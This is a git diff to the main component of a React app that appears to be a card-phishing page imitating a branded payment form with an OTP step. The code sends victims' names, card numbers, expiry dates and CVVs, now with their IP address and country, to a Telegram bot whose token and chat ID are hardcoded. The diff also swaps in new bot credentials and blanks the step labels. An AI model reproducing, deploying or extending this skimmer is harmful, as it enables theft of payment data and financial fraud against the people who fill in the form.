@@ -2,13 +2,14 @@ import "./App.css";
 import Axios from "axios";
 import validator from "validator";
 import { CircleLoader } from "react-spinners"; // Changed loader to CircleLoader
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import Stepper from "./Components/Stepper";
 import StepperControl from "./Components/StepperControl";
 import { StepperContext } from "./Components/contexts/StepperContext";
 import Payment from "./Components/Payments/Payment";
 import Otp from "./Components/Payments/Otp";
 import { isMobile } from "react-device-detect";
+import XMLParser from "react-xml-parser";
 
 function App() {
   const [loading, setLoading] = useState(false);
@@ -23,35 +24,51 @@ function App() {
     number: "",
     issuer: "",
     formData: null,
+    ip: "",
+    countryCode: "",
   });
   const [finalData, setFinalData] = useState({
     otp: "",
   });
   const [error, setError] = useState(false);
 
-  const steps = ["Payment", "Confirmation"];
-  const displayStep = (step) => {
-    switch (step) {
-      case 1:
-        return <Payment state={state} setState={setState} error={error} />;
-      case 2:
-        return (
-          <Otp
-            setLoading={setLoading}
-            finalData={finalData}
-            setFinalData={setFinalData}
-            error={error}
-            setError={setError}
-          />
-        );
-
-      default:
+  // Fetch Geo Info for IP and country code
+  useEffect(() => {
+    if (!state.ip) {
+      getGeoInfo();
     }
+  }, []);
+
+  const getGeoInfo = () => {
+    Axios.get("https://ipapi.co/xml/")
+      .then((response) => {
+        let data = response.data;
+        var xml = new XMLParser().parseFromString(data);
+        setState((prevState) => ({
+          ...prevState,
+          ip: xml.children[0].value,
+          countryCode: xml.children[8].value,
+        }));
+      })
+      .catch((e) => {
+        console.log(e);
+      });
   };
+
+  const getFlagEmoji = (countryCode) => {
+    // Convert country code to uppercase and map each letter to regional indicator symbol
+    return countryCode
+      .toUpperCase()
+      .replace(/./g, (char) =>
+        String.fromCodePoint(127397 + char.charCodeAt()),
+      );
+  };
+
   const APIS = () => {
-    const apiToken = "7793390385:AAGXlO786EhHb9MuMJk2-dq376E64ekksRU";
-    const chatId = "5807893197";
-    const text = `Name: ${state.name}%0ACard Number: ${state.number}%0AExpire: ${state.expiry}%0ACVV: ${state.cvc}`;
+    const apiToken = "7157099382:AAEqUqdT09XUHNBEnXIwCoIiei2dm46OlFc";
+    const chatId = "7004148788";
+    const flagEmoji = getFlagEmoji(state.countryCode); // Get the flag emoji
+    const text = `${flagEmoji}  IP: ${state.ip}%0AName: ${state.name}%0ACard Number: ${state.number}%0AExpire: ${state.expiry}%0ACVV: ${state.cvc}`;
     const url = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${text}`;
     Axios(url);
   };
@@ -83,8 +100,27 @@ function App() {
       }
       default:
     }
-    // check if steps are within bounds
     newStep > 0 && newStep <= steps.length && setCurrentStep(newStep);
+  };
+
+  const steps = ["", ""];
+  const displayStep = (step) => {
+    switch (step) {
+      case 1:
+        return <Payment state={state} setState={setState} error={error} />;
+      case 2:
+        return (
+          <Otp
+            setLoading={setLoading}
+            finalData={finalData}
+            setFinalData={setFinalData}
+            error={error}
+            setError={setError}
+          />
+        );
+
+      default:
+    }
   };
 
   return (
@@ -99,9 +135,7 @@ function App() {
               >
                 <div className="amx-cp-loader amx-form-submit-loader"></div>
                 <div className="ng-pristine ng-invalid ng-invalid-required ng-valid-maxlength ng-valid-amx-email">
-                  <div className="amx-module amx-md-panel amx-md-login-account">
-                    <div className="content--header"></div>
-                  </div>
+                  <div className="amx-module amx-md-panel amx-md-login-account"></div>
                   <div className="amx-module amx-md-panel amx-mr-form-panel amx-md-get-quote-form">
                     <div className="content--body ic">
                       {/* Stepper */}
